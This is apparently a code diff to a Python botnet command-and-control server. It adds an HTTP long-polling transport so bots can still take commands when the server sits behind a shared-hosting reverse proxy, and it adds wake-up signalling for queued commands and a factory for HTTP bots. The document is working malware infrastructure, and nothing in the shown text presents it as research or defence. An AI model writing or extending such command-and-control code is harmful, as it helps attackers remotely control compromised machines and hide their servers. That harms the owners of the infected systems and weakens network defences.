@@ -31,13 +31,25 @@ def log(fmt, *args):
 
 
 class Bot:
-    """One connected bot."""
+    """
+    One connected bot.
 
-    def __init__(self, bot_id: str, sock: socket.socket, addr, info: dict):
+    Two transports are supported:
+
+      "tcp"  a raw socket, used when the server owns the port
+      "http" a long-polling HTTP session, used when the server sits behind
+             a shared-hosting reverse proxy and cannot bind a port of its
+             own. The HTTP bot has no socket; the panel talks to it through
+             the same command/response protocol.
+    """
+
+    def __init__(self, bot_id: str, sock: socket.socket, addr, info: dict,
+                 transport: str = "tcp"):
         self.id = bot_id
         self.sock = sock
         self.addr = addr
         self.info = info
+        self.transport = transport
         self.outbox = queue.Queue()
         self.alive = True
         self.lock = threading.Lock()
@@ -46,9 +58,16 @@ class Bot:
         self.pending = {}
         self.cond = threading.Condition()
         self.events = []          # recent events, for the panel
+        # Signalled whenever a command is queued, so a long-polling HTTP
+        # bot can be woken up instead of waiting for its timeout.
+        self.cmd_cv = threading.Condition()
+        self.cmd_seq = 0
 
     def send(self, type_: int, payload: bytes = b""):
         self.outbox.put((type_, payload))
+        with self.cmd_cv:
+            self.cmd_seq += 1
+            self.cmd_cv.notify_all()
 
     def send_json(self, type_: int, obj: dict):
         self.send(type_, json.dumps(obj, separators=(",", ":")).encode("utf-8"))
@@ -95,6 +114,11 @@ class Bot:
 
     def close(self):
         self.alive = False
+        with self.cmd_cv:
+            self.cmd_seq += 1
+            self.cmd_cv.notify_all()
+        if self.sock is None:
+            return
         try:
             self.sock.shutdown(socket.SHUT_RDWR)
         except OSError:
@@ -264,6 +288,10 @@ class Heartbeat(threading.Thread):
                     bot.close()
                     self.server.registry.remove(bot)
                     continue
+                if bot.transport != "tcp":
+                    # An HTTP bot keeps itself alive by polling; it has no
+                    # socket to ping.
+                    continue
                 bot.send(P.TYPE_PING, b"")
 
 
@@ -338,6 +366,12 @@ class C2Server:
             ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
             ctx.load_cert_chain(c2["cert"], c2.get("key") or None)
             self.ssl_ctx = ctx
+
+    def make_http_bot(self, bot_id, info):
+        """Creates a Bot that speaks HTTP long polling instead of TCP."""
+        bot = Bot(bot_id, None, ("http", info.get("host", "?")), info,
+                  transport="http")
+        return bot
 
     def start(self):
         srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
